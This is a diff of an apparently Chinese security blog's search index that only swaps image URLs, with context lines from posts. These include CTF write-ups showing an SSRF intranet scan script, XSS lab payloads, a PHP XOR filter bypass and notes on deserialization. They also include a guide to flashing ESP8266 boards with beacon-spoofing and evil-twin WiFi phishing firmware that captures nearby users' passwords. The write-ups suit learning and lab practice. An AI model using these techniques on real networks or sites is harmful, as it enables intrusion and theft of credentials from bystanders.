 <p>然后求得压缩包密码<code>GG0kc.tf</code>，解压得到<code>逆光 vocal.ovex</code>文件。使用<code>Overture 5</code>打谱软件打开，在歌词里看到flag。</p>
 ]]></content>
@@ -1035,7 +1035,7 @@
 <li>如果仍然找不到，则继续在<code>Lee.__proto__.__proto__</code>中寻找eat属性</li>
 <li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
 </ol>
-<img src="http://img.kawhi.xyz/image-20200719212225968.png" style="high:100%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200719212225968.png" style="high:100%;width:100%;" />
 
 <p><strong>小结</strong></p>
 <ul>
@@ -1184,7 +1184,7 @@
 
 在上述代码中，直接将用户可控参数`request.args.get('404_url')`在模板中直接渲染并传回页面中，这种不正确的渲染方法会产生模板注入(SSTI)。
 
-<img src="http://img.kawhi.xyz/image-20200807151918090.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200807151918090.png" style="high:80%;width:80%;" />
 
 可以看到，页面直接返回了81而不是{{9*9}}
 
@@ -1518,14 +1518,14 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p>可以看到经过了一个正则的匹配才可以<code>curl($url);</code>。</p>
 <p>从正则可以看出过滤了<code>file://</code>，<code>dict</code>，<code>127.0.0.1</code>，<code>localhost</code>，<code>../</code>但是没有过滤http协议和gopher协议。看到如果get传值secret会执行ifconfig。</p>
 <p>按F12在有个注释也可以发现?secret，访问?secret得到本机ip</p>
-<img src="http://img.kawhi.xyz/image-20200527114207278.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200527114207278.png" style="high:80%;width:80%;" />
 
 <p>写个脚本探测内网</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;173.17.51.&#123;&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ac0d31a7-5126-4f26-a7ec-b38aceea896a.node3.buuoj.cn&#x27;</span></span><br><span class="line">temp = <span class="string">&quot;&#123;0&#125;/index.php?url=&#123;1&#125;&amp;&amp;submit=提交&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    u = temp.format(url, ip.format(i))</span><br><span class="line">    resp = requests.get(u)</span><br><span class="line">    <span class="keyword">if</span> len(resp.text) != <span class="number">421</span>:</span><br><span class="line">    	print(i)</span><br></pre></td></tr></table></figure>
 
 <p>跑出结果4 5 6 7 10 11，一个一个试，11的时候给出了提示，当然这里不用写脚本，用burp去爆破也是可以的。</p>
 <p>获取到地址之后，然后用burp爆破端口。</p>
-<img src="http://img.kawhi.xyz/image-20200527114920600.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200527114920600.png" style="high:80%;width:80%;" />
 
 <p>payloads选numbers爆破1到65535端口，线程选1。一般来说猜测是6379端口（redis）或3306端口（mysql），当然爆破出结果是6374。</p>
 <p>因为输入url这里只限制了<code>file://</code>，没有ban掉<code>gopher://</code>，很容易想到是Redis SSRF getshell。</p>
@@ -1649,11 +1649,11 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 
 <p>其中<code>[\s\S]</code>表示通配，看到后面有一个<code>eval</code>函数，尝试是否可以写进函数。</p>
 <p>这里随便试一下可以发现，这个正则式可以匹配的。</p>
-<img src="http://img.kawhi.xyz/image-20200821150736049.png" alt="image-20200821150736049" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200821150736049.png" alt="image-20200821150736049" style="high:80%;width:80%;" />
 
 <p>这里在本地测试把<code>danger_key</code>过滤函数去掉之后发现，再传<code>phpinfo</code></p>
 <p>直接出现<code>phpinfo()</code>的页面</p>
-<img src="http://img.kawhi.xyz/image-20200821093807478.png" alt="image-20200821093807478" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200821093807478.png" alt="image-20200821093807478" style="high:80%;width:80%;" />
 
 <p>然后就是绕过<code>danger_key</code>，这里过滤php以及一些函数等等，尝试用异或构造字符。</p>
 <p>异或构造<code>phpinfo()</code></p>
@@ -1698,14 +1698,14 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <li>wifi杀手固件及烧录固件的软件</li>
 </ul>
 <h5 id="烧录固件"><a href="#烧录固件" class="headerlink" title="烧录固件"></a><strong>烧录固件</strong></h5><p>先下载烧录的工具，在烧录之前先ERASE擦除一下原来的数据，选好端口(COM)和波特率(BAUD),然后把提前下载好的固件烧录进去即可。</p>
-<img src="http://img.kawhi.xyz/image-20200302201605251.png" alt="image-20200302201605251" style="high:30%;width:30%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200302201605251.png" alt="image-20200302201605251" style="high:30%;width:30%;" />
 
 <h5 id="进入后台"><a href="#进入后台" class="headerlink" title="进入后台"></a><strong>进入后台</strong></h5><p>在烧录进去之后需要按一下板子的RST</p>
 <p>然后可以看到自己的WIFI列表多了名为zhangguangzhang的wifi账号，密码同WIFi账号。连接之后进入192.168.4.1。</p>
-<img src="http://img.kawhi.xyz/image-20200302203452958.png" alt="image-20200302203452958" style="high:80%;width:100%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200302203452958.png" alt="image-20200302203452958" style="high:80%;width:100%;" />
 
 <p>这里我选择了beacon攻击，几秒钟后板子附近的wifi都改成了你想改的名字。</p>
-<p><img src="http://img.kawhi.xyz/image-20200302204350279.png" alt="image-20200302204350279" style="high:30%;width:30%;" /><img src="http://img.kawhi.xyz/image-20200302203524575.png" alt="image-20200302203524575" style="high:30%;width:30%;" /></p>
+<p><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200302204350279.png" alt="image-20200302204350279" style="high:30%;width:30%;" /><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200302203524575.png" alt="image-20200302203524575" style="high:30%;width:30%;" /></p>
 <p>停止攻击即可恢复如初，不用担心改不回来。</p>
 <p>里面还有其他功能，可以自己尝试一下有什么效果。</p>
 <p>所需要的固件和工具在百度都能找到</p>
@@ -1716,21 +1716,21 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <li>wifi钓鱼固件及烧录固件的软件</li>
 </ul>
 <h5 id="烧录固件-1"><a href="#烧录固件-1" class="headerlink" title="烧录固件"></a><strong>烧录固件</strong></h5><p>首先将wifi钓鱼的固件烧录进去板子</p>
-<img src="http://img.kawhi.xyz/image-20200405213955923.png" alt="image-20200405213955923" style="high:30%;width:30%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200405213955923.png" alt="image-20200405213955923" style="high:30%;width:30%;" />
 
 <h5 id="进入后台-1"><a href="#进入后台-1" class="headerlink" title="进入后台"></a><strong>进入后台</strong></h5><p>我这里用的固件是别人写好的wifi钓鱼固件。烧录好之后重启一下板子。再wifi列表会多出一个wifi。</p>
 <p>wifi名称：FishAP，密码：gkdamm666。</p>
 <p>然后连接上wifi，再在你的浏览器输入<a href="http://192.168.0.1/backdoor.html">http://192.168.0.1/backdoor.html</a></p>
-<img src="http://img.kawhi.xyz/QQ%E6%88%AA%E5%9B%BE20200405193017.png" style="high:50%;width:50%;"/>
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/QQ%E6%88%AA%E5%9B%BE20200405193017.png" style="high:50%;width:50%;"/>
 
 <p>可以看到附近的wifi列表，选择通用型，再输入编号。按确认即可开始钓鱼。</p>
 <h5 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a><strong>获取密码</strong></h5><p>这时候被钓鱼的wifi会连接不上，并且这时候我们板子的wifi(FishAP)的名字会伪装成被钓鱼wifi的名字。板子的蓝灯会开始常亮。</p>
 <p>然后被钓鱼的手机会连上我们伪造的wifi,然后继续会弹出我们钓鱼后台(192.168.0.1)，如图</p>
-<img src="http://img.kawhi.xyz/wifi123.png" alt="image-wifi123" style="high:50%;width:50%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/wifi123.png" alt="image-wifi123" style="high:50%;width:50%;" />
 
 <p>当然，这时候他是上不了网的，如果他输入了wifi密码的话，钓鱼就成功了。在按升级完毕之后，我们的板子的灯会灭，说明已经成功的获取密码了。</p>
 <p>这时候再重新连接我们板子的wifi(FishAP)。即可看到钓鱼的密码。</p>
-<img src="http://img.kawhi.xyz/QQ%E6%88%AA%E5%9B%BE20200405211928.jpg" style="high:60%;width:60%;" />]]></content>
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/QQ%E6%88%AA%E5%9B%BE20200405211928.jpg" style="high:60%;width:60%;" />]]></content>
       <categories>
         <category>硬件</category>
       </categories>
@@ -1740,11 +1740,11 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
     <url>/2020/03/21/esp8266%E8%BF%9E%E6%8E%A5%E6%98%BE%E7%A4%BA%E5%99%A8/</url>
     <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h5><p>简介:本篇文章展示用OLED显示屏与ESP8266连接。OLED淘宝上一般有两种，4引脚(IIC)和7引脚(SPI)，7引脚的屏幕就稍微大点。这里我用的是4引脚。接线如下所示。基本就3.3接vcc，gnd地线接地线没有问题，引用角D1(GPIO5)，D2(GPIO4)接SLC和SDA。<a id="more"></a></p>
 <p><strong>价格：</strong>一个esp8266和oled显示器加起来也就20块左右。</p>
-<img src="http://img.kawhi.xyz/image-20200321115923891.png" alt="image-20200321115923891" style="high:40%;width:40%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200321115923891.png" alt="image-20200321115923891" style="high:40%;width:40%;" />
 
 <h5 id="基本显示"><a href="#基本显示" class="headerlink" title="基本显示"></a><strong>基本显示</strong></h5><p><strong>输出hello world！</strong></p>
 <p>首先要装一个U8g2的库，然后只需要短短10多行代码即可显示。</p>
-<img src="http://img.kawhi.xyz/image-20200321104619926.png" alt="image-20200321104619926" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200321104619926.png" alt="image-20200321104619926" style="high:80%;width:80%;" />
 
 <p><strong>输出动画</strong></p>
 <p>项目代码：<a style="text-decoration:none;" class="foo" href="https://github.com/icomgx/esp8266_codePlayer" target="_blank">传送门</a></p>
@@ -1754,19 +1754,21 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 </video>
 
 
-<h5 id="显示电脑情况"><a href="#显示电脑情况" class="headerlink" title="显示电脑情况"></a><strong>显示电脑情况</strong></h5><img src="http://img.kawhi.xyz/image-20200320212053043.png" alt="image-20200320212053043" style="high:80%;width:80%;" />
+
+
+<h5 id="显示电脑情况"><a href="#显示电脑情况" class="headerlink" title="显示电脑情况"></a><strong>显示电脑情况</strong></h5><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200320212053043.png" alt="image-20200320212053043" style="high:80%;width:80%;" />
 
 <p>项目代码：<a style="text-decoration:none;" class="foo" href="https://github.com/flyAkari/AIDA64Reader" target="_blank">传送门</a></p>
 <p>所需工具：AIDA64，Arduino的u8g2库。</p>
 <p>在AIDA64把下图都勾选上，再把代码上传到esp8266板子上即可。</p>
-<img src="http://img.kawhi.xyz/image-20200320212408242.png" alt="image-20200320212408242" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200320212408242.png" alt="image-20200320212408242" style="high:80%;width:80%;" />
 
 
-<h5 id="显示北京时间"><a href="#显示北京时间" class="headerlink" title="显示北京时间"></a><strong>显示北京时间</strong></h5><img src="http://img.kawhi.xyz/image-20200321102945702.png" alt="image-20200321102945702" style="high:80%;width:80%;" />
+<h5 id="显示北京时间"><a href="#显示北京时间" class="headerlink" title="显示北京时间"></a><strong>显示北京时间</strong></h5><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200321102945702.png" alt="image-20200321102945702" style="high:80%;width:80%;" />
 
 <p>项目代码：<a style="text-decoration:none;" class="foo" href="https://github.com/flyAkari/ESP8266_Network_Clock" target="_blank">传送门</a></p>
 <p>这个项目是使用的烧录工具直接上传的，免去了搭建环境的麻烦。</p>
-<h5 id="显示实时肺炎疫情"><a href="#显示实时肺炎疫情" class="headerlink" title="显示实时肺炎疫情"></a><strong>显示实时肺炎疫情</strong></h5><img src="http://img.kawhi.xyz/image-20200321113448668.png" alt="image-20200321113448668" style="high:80%;width:80%;" />
+<h5 id="显示实时肺炎疫情"><a href="#显示实时肺炎疫情" class="headerlink" title="显示实时肺炎疫情"></a><strong>显示实时肺炎疫情</strong></h5><img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200321113448668.png" alt="image-20200321113448668" style="high:80%;width:80%;" />
 
 <p>项目代码：<a style="text-decoration:none;" class="foo" href="https://gitee.com/ikcty/pneumonia" target="_blank">传送门</a></p>
 <p>这里需要装一个Arduinojson库，同时需要运行代码里面的python服务端。代码里面具体怎么实现我就没有去研究了。</p>
@@ -1783,7 +1785,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <h5 id="level1"><a href="#level1" class="headerlink" title="level1"></a><strong>level1</strong></h5><p>没有任何过滤，直接给name传值，<strong>payload：</strong></p>
 <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<img src="http://img.kawhi.xyz/image-20200429170941592.png" alt="image-20200429170941592" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200429170941592.png" alt="image-20200429170941592" style="high:80%;width:80%;" />
 
 <p>源代码：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;name&quot;</span>];</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;欢迎用户&quot;</span>.$str.<span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
@@ -1858,7 +1860,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 
 <p>发现<code>keyword</code>和<code>t_sort</code>这两个参数都被<code>htmlspecialchars</code>。</p>
 <p>而<code>t_ref</code>是refer头，过滤了尖括号。截包改refer头即可。</p>
-<img src="http://img.kawhi.xyz/image-20200429203051769.png" alt="image-20200429203051769" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200429203051769.png" alt="image-20200429203051769" style="high:80%;width:80%;" />
 
 <p><strong>payload:</strong></p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">referer:<span class="string">&quot;type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>
@@ -1867,7 +1869,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>和11关类似：</p>
-<img src="http://img.kawhi.xyz/image-20200429203527694.png" alt="image-20200429203527694" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200429203527694.png" alt="image-20200429203527694" style="high:80%;width:80%;" />
 
 <p><strong>payload：</strong></p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">User-Agent:<span class="string">&quot;type=&quot;</span>text<span class="string">&quot; onclick=&quot;</span>alert(<span class="regexp">/xss/</span>)</span><br></pre></td></tr></table></figure>
@@ -1876,7 +1878,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">setcookie(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;call me maybe?&quot;</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">&quot;keyword&quot;</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">&quot;t_sort&quot;</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">&quot;user&quot;</span>];</span><br><span class="line">$str22=str_replace(<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&quot;</span>,$str22);</span><br><span class="line">echo <span class="string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.htmlspecialchars($str).<span class="string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="string">&#x27;&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.htmlspecialchars($str00).<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.$str33.<span class="string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>和前两关差不多，传cookie进user变量。</p>
-<img src="http://img.kawhi.xyz/image-20200429204317830.png" alt="image-20200429204317830" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200429204317830.png" alt="image-20200429204317830" style="high:80%;width:80%;" />
 
 <p><strong>payload:</strong></p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">user=<span class="string">&quot; onclick=alert(/xss/) type=&quot;</span>button<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
@@ -1934,7 +1936,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">im = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">box = (<span class="number">150</span>,<span class="number">150</span>,<span class="number">245</span>,<span class="number">280</span>)</span><br><span class="line">region = im.crop(box)</span><br><span class="line">region.show()</span><br></pre></td></tr></table></figure>
 
 <p>关于这个box，这是一个4元的坐标数组，坐标轴是左上角是(0,0)的卡迪尔坐标系。 假设box是(x1,y1,x2,y2)，则所取区域是以各自坐标划线所围的区域。</p>
-<img src="http://img.kawhi.xyz/image-20200419225057613.png" alt="image-20200419225057613" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200419225057613.png" alt="image-20200419225057613" style="high:80%;width:80%;" />
 
 <p><strong>（2）图片黏贴</strong></p>
 <p>图片的黏贴就是将一张图覆盖到另一张图上面。黏贴的方法是paste()。格式为：paste(要贴的图片，要贴的图片的4元坐标组成的区域)。如下面，我们把Mycat.jpg这张图片，取区域(50,50,200,200)，将该区域旋转180度后贴到原来的位置。</p>
@@ -1952,7 +1954,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;Mycat.jpg&#x27;</span>)</span><br><span class="line">width , height = img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,width):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,height):</span><br><span class="line">    tmp = img.getpixel((i,j))</span><br><span class="line">    img.putpixel((i,j),(<span class="number">0</span>,<span class="number">0</span>,tmp[<span class="number">2</span>]))</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>
 
 <h4 id="CTF实例："><a href="#CTF实例：" class="headerlink" title="CTF实例："></a><strong>CTF实例：</strong></h4><h5 id="红绿灯"><a href="#红绿灯" class="headerlink" title="红绿灯"></a><strong>红绿灯</strong></h5><p>首先题目是一张gif，用2345看图王或者PS打开都可以，会发现有1168帧，然后保存所有帧。</p>
-<img src="http://img.kawhi.xyz/image-20200419184820875.png" alt="image-20200419184820875" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200419184820875.png" alt="image-20200419184820875" style="high:80%;width:80%;" />
 
 <p>会发现多数是绿灯和红灯，偶尔有黄灯，可以推测红色和绿色对应二进制0和1，黄色作为分隔。</p>
 <p>这样第一个黄灯之前数值为01100110或10011001，而01100110二进制转成ascii对应字符就是‘f’,依次可以验证前四个字符为flag。就可以确定绿灯对应0，红灯对应1。</p>
@@ -1976,7 +1978,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;C:\\Users\\Think\\Desktop\\glance\\&#x27;</span></span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">2</span>*<span class="number">201</span>,<span class="number">600</span>))</span><br><span class="line">width = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">201</span>):</span><br><span class="line">  im.paste(Image.open(path+<span class="string">&#x27;glance_&#x27;</span>+str(i)+<span class="string">&#x27;.JPG&#x27;</span>),(width,<span class="number">0</span>,<span class="number">2</span>+width,<span class="number">600</span>))</span><br><span class="line">  width = width +<span class="number">2</span></span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure>
 
 <h5 id="判断图片颜色"><a href="#判断图片颜色" class="headerlink" title="判断图片颜色"></a><strong>判断图片颜色</strong></h5><p>题目是：</p>
-<img src="http://img.kawhi.xyz/image-20200419200921372.png" alt="image-20200419200921372" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200419200921372.png" alt="image-20200419200921372" style="high:80%;width:80%;" />
 
 <p>这里应该是黑色白色对应01，然后转成字符串。</p>
 <p>编写脚本：</p>
@@ -1985,7 +1987,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p>即可得到flag。</p>
 <h5 id="LSB隐写"><a href="#LSB隐写" class="headerlink" title="LSB隐写"></a><strong>LSB隐写</strong></h5><p>LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB）</p>
 <p>首先来讲png图片，png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。而png图片虽然也有压缩，但却是无损压缩，这样我们修改的信息也就能得到正确的表达，不至于丢失。BMP的图片也是一样的，是没有经过压缩的。BMP图片一般是特别的大的，因为BMP把所有的像数都按原样储存，没有进行压缩。</p>
-<img src="http://img.kawhi.xyz/image-20200419222005146.png" alt="image-20200419222005146" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200419222005146.png" alt="image-20200419222005146" style="high:80%;width:80%;" />
 
 <p>上图我们可以看到，十进制的235表示的是绿色，我们修改了在二进制中的最低位，但是颜色看起来依旧没有变化。我们就可以修改最低位中的信息，实现信息的隐写。</p>
 <p>这里的题目是一张png图片：</p>
@@ -1994,7 +1996,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.open(<span class="string">&#x27;C:\\Users\\Think\\Desktop\\LSB\\01.png&#x27;</span>)</span><br><span class="line">width,height=img.size</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,width):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,height):</span><br><span class="line">		tmp = img.getpixel((i,j))</span><br><span class="line">		<span class="keyword">if</span> tmp&amp;<span class="number">1</span> == <span class="number">0</span>:</span><br><span class="line">			img.putpixel((i,j),<span class="number">0</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			img.putpixel((i,j),<span class="number">255</span>)</span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure>
 
 <p>即可得到一张二维码。扫码即可得到flag。</p>
-<img src="http://img.kawhi.xyz/image-20200419222749603.png" alt="image-20200419222749603" style="high:80%;width:80%;" />]]></content>
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200419222749603.png" alt="image-20200419222749603" style="high:80%;width:80%;" />]]></content>
       <categories>
         <category>杂项</category>
       </categories>
@@ -2262,7 +2264,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p>可以这个代码表达式计算出异或可见的结果</p>
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">128</span>;$i&lt;<span class="number">255</span>;$i++)&#123;</span><br><span class="line">    <span class="keyword">echo</span> sprintf(<span class="string">&quot;%s^%s&quot;</span>,urlencode(chr($i)),urlencode(chr(<span class="number">255</span>))).<span class="string">&quot;=&gt;&quot;</span>. (chr($i)^chr(<span class="number">255</span>)).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<img src="http://img.kawhi.xyz/image-20200724162439697.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200724162439697.png" style="high:80%;width:80%;" />
 
 
 
@@ -2677,7 +2679,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p>序列化和反序列化本身没有问题，但是如果反序列化的内容是用户可以控制的，且后台不正当的使用了PHP中的魔法函数，就会导致安全问题。</p>
 <p>我们通常把<strong>字符串/数组/对象</strong>进行序列化，然后再反序列化被序列化的<strong>字符串/数组/对象</strong>。</p>
 <p>首先举一个简单的例子</p>
-<img src="http://img.kawhi.xyz/image-20200711120132680.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711120132680.png" style="high:80%;width:80%;" />
 
 <p><strong>分析一下序列化之后的含义</strong></p>
 <p><strong>字符串：</strong></p>
@@ -2690,7 +2692,7 @@ a[0]与a.**getitem**(0)的效果是一样的，所以上述payload可以用此�
 <p><code>class ABC&#123;public $name=&quot;kawhi&quot; ;&#125;</code>创建对象后，序列化后的结果是<code>O:3:&quot;ABC&quot;:1:&#123;s:4:&quot;name&quot;;s:5:&quot;kawhi&quot;;&#125;</code></p>
 <p>其中O表示存储的对象(object类型)，3代表对象名称有3个字符，即ABC，1表示有一个值，s代表string类型，4代表字符串长度，name代表字符串名称，依此类推。</p>
 <p>如果在被序列化的对象中加入一些恶意的代码，如XSS弹窗，那么在进行反序列化的时候就相当于解码操作，然后会自动执行。</p>
-<img src="http://img.kawhi.xyz/image-20200711121735182.png" style="high:80%;width:80%;" />
+<img src="http://yuhaojiang.gitee.io/picture/typora-user-images/image-20200711121735182.png" style="high:80%;width:80%;" />
 
